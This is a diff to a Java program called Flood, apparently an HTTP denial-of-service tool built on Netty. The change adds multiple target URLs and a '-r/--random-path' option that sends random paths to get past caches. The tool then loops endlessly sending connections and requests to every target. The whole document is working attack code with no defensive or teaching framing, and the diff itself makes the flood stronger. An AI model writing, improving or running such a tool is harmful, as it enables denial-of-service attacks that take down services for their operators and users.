@@ -20,7 +20,13 @@ import io.netty.handler.ssl.SslContext;
 import io.netty.handler.ssl.SslContextBuilder;
 import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
 import java.net.URI;
+import java.net.URISyntaxException;
 import java.security.KeyManagementException;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Random;
+import java.util.stream.Collectors;
+import java.util.stream.IntStream;
 
 public class Flood {
 
@@ -29,15 +35,21 @@ public class Flood {
     private final DefaultHttpRequest request;
     private final String host;
     private final int port;
+    private final boolean randomPath;
+    private static final char[] ALPHABET = "abcdefghijklmnopqrstuvwxyz".toCharArray();
+    private static final int ALPHABET_LENGTH = ALPHABET.length;
+    private static final Random R = new Random();
 
-    public Flood(URI uri) throws KeyManagementException {
-        this.host = uri.getHost();
+    public Flood(String target, boolean randomPath) throws KeyManagementException, URISyntaxException {
+        this.randomPath = randomPath;
+        URI uri = new URI(target);
+        host = uri.getHost();
         boolean isHttps = "https".equals(uri.getScheme());
         int uriPort = uri.getPort();
         if (uriPort == -1) {
             uriPort = isHttps ? 443 : 80;
         }
-        this.port = uriPort;
+        port = uriPort;
         b = new Bootstrap();
         b.group(workerGroup);
         b.channel(NioSocketChannel.class)
@@ -70,6 +82,9 @@ public class Flood {
     }
 
     public void go() {
+        if (randomPath) {
+            request.setUri(getRandomPath());
+        }
         ChannelFuture f = b.connect(host, port);
         f.addListener((future) -> {
             if (future.isSuccess()) {
@@ -90,23 +105,51 @@ public class Flood {
         }
     }
 
-    public static void main(String[] args) throws Exception {
-        //String target = "https://192.168.132.136:8844/";
-        //String target = "http://192.168.253.135:8844/aa";
+    private static int getRandom(int max) {
+        return R.nextInt(max);
+    }
+
+    private static int getRandom(int min, int max) {
+        if (min > max) {
+            min = max;
+        }
+        return R.nextInt((max - min) + 1) + min;
+    }
+
+    private static String getRandomPath() {
+        return "/" + IntStream.rangeClosed(1, getRandom(1, 4)).mapToObj((int v1) -> {
+            return IntStream.rangeClosed(1, getRandom(3, 10)).mapToObj((int v2) -> {
+                return ALPHABET[getRandom(ALPHABET_LENGTH)];
+            }).map(String::valueOf).collect(Collectors.joining());
+        }).collect(Collectors.joining("/"));
+    }
+
+    public static void main(String[] args) throws KeyManagementException, URISyntaxException {
         if (args.length < 1) {
-            System.err.println("Usage: http-flood URL");
+            System.err.println("Usage: http-flood [-r|--random-path] URL [URL...]");
             System.exit(1);
         }
-        String target = args[0];
-        URI uri = new URI(target);
-        Flood flood = new Flood(uri);
-        while (true) {
-            flood.go();
+        ArrayList<String> options = new ArrayList<>();
+        ArrayList<String> targets = new ArrayList<>();
+        Arrays.stream(args).forEach((String arg) -> {
+            if (arg.startsWith("-")) {
+                options.add(arg);
+            } else {
+                targets.add(arg);
+            }
+        });
+        boolean randomPath = options.stream().anyMatch((String option) -> {
+            return Arrays.asList("-r", "--random-path").contains(option);
+        });
+        ArrayList<Flood> floods = new ArrayList<>();
+        for (String target : targets) {
+            floods.add(new Flood(target, randomPath));
         }
-        //System.out.println("asdf");
-        //flood.terminate();
-        //while (true) {
-        //    Thread.sleep(1000);
-        //}
+        while (true) {
+            floods.forEach((Flood flood) -> {
+                flood.go();
+            });
+        }
     }
+
 }
